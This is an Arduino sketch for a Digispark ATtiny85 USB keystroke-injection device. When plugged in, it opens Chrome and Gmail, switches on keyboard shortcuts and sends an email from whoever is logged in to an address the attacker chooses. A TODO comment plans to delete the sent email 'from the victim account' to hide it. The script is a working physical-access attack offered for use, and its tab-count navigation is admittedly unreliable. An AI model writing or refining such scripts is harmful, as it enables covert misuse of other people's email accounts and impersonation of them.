/*Created by R3tr0R4ke (Github: https://github.com/R3tr0R4ke)
 *To send correctly the email you have an English (United States) layout for your keyobaord.
 *This is my first script that i try to write alone for the Digispark Attiny85
 *feel free to contact me if you have suggestions to improve codes or suggest it directly on Github*/
 
#include "DigiKeyboard.h"
#define KEY_TAB     43                                    
#define KEY_ARROW_DOWN  0x51

void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(0);

  //Open the browser:
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | 0);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("chrome");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(2500);
  //Open Gmail:
  DigiKeyboard.print("gmail.com");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(4000);
  //Navigate to the option button, depends on something i have to figure out
  //it work sometimes with 8 and sometimes with 23
  for (int i = 0; i <= 8; i++)    
  {
    DigiKeyboard.sendKeyStroke(KEY_TAB, 0);  
  }
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(500);
  //Enter in "View all settings":
  DigiKeyboard.sendKeyStroke(KEY_TAB, 0);
  DigiKeyboard.sendKeyStroke(KEY_TAB, 0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(1500);
  //Scroll down to "activate keyboard shortcut":
  for (int i = 0; i <= 53; i++)
  {
    DigiKeyboard.sendKeyStroke(KEY_TAB, 0);  
  }
  DigiKeyboard.delay(500);
  //Depends if the user have it already activated, hope it is dissactived first
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN, 0);
  DigiKeyboard.delay(500);
  //Confirm selection:
  for (int i = 0; i <= 17; i++)
  {
    DigiKeyboard.sendKeyStroke(KEY_TAB, 0);
  }
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(1500);
  
  //Open email sender box:
  DigiKeyboard.sendKeyStroke(KEY_C, 0);
  DigiKeyboard.delay(1000);
  //Select user to send the email:
  DigiKeyboard.print("user Email");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("@gmail.com");
  DigiKeyboard.sendKeyStroke(KEY_TAB, 0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB, 0);
  DigiKeyboard.delay(500);
  //Object email section:
  DigiKeyboard.print("Text example");
  DigiKeyboard.sendKeyStroke(KEY_TAB, 0);
  DigiKeyboard.delay(500);
  //Message email section:
  DigiKeyboard.print("Some string you can change with your text");
  DigiKeyboard.sendKeyStroke(KEY_TAB, 0);
  DigiKeyboard.delay(500);
  //Send the email:
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  //TODO: implement the part where the email sent is deleted from the victim account
}
                                                                                      
void loop() {
  // put your main code here, to run repeatedly:
}
